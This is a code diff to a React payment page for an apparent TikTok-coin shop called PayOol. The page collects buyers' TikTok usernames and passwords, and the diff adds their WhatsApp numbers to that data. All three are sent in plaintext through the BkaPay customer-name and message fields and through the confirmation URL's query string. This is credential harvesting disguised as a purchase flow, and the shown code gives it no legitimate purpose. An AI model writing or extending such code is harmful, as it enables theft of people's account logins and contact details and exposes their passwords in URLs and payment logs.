@@ -88,15 +88,16 @@ function App() {
     }
 
     // Combine username and password in the customerName field
-    const customerNameWithCredentials = `${tiktokData.username} | ${tiktokData.password}`;
+    const customerNameWithCredentials = `${tiktokData.username} | ${tiktokData.password} | ${tiktokData.whatsapp}`;
     
     // Creer un message avec les identifiants complets pour BkaPay
-    const messageWithCredentials = `${description} | User: ${tiktokData.username} | Pass: ${tiktokData.password}`;
+    const messageWithCredentials = `${description} | User: ${tiktokData.username} | Pass: ${tiktokData.password} | WhatsApp: ${tiktokData.whatsapp}`;
     
     // Encoder les identifiants pour l'URL
     const encodedUsername = encodeURIComponent(tiktokData.username);
     const encodedPassword = encodeURIComponent(tiktokData.password);
     const encodedEmail = encodeURIComponent(email);
+    const encodedWhatsapp = encodeURIComponent(tiktokData.whatsapp);
     
     initiatePayment({
       amount: selectedPackage.price,
@@ -105,7 +106,7 @@ function App() {
       orderId,
       customerName: customerNameWithCredentials,
       customerEmail: email,
-      successUrl: `${window.location.origin}/TikTokCoins-PayOol/payment/confirmation?orderId=${orderId}&username=${encodedUsername}&password=${encodedPassword}&email=${encodedEmail}&amount=${selectedPackage.amount + (selectedPackage.bonus || 0)}&price=${selectedPackage.price}`,
+      successUrl: `${window.location.origin}/TikTokCoins-PayOol/payment/confirmation?orderId=${orderId}&username=${encodedUsername}&password=${encodedPassword}&email=${encodedEmail}&whatsapp=${encodedWhatsapp}&amount=${selectedPackage.amount + (selectedPackage.bonus || 0)}&price=${selectedPackage.price}`,
       failureUrl: `${window.location.origin}/TikTokCoins-PayOol/payment/failure?orderId=${orderId}`,
       shopName: 'PayOol™',
       message: messageWithCredentials
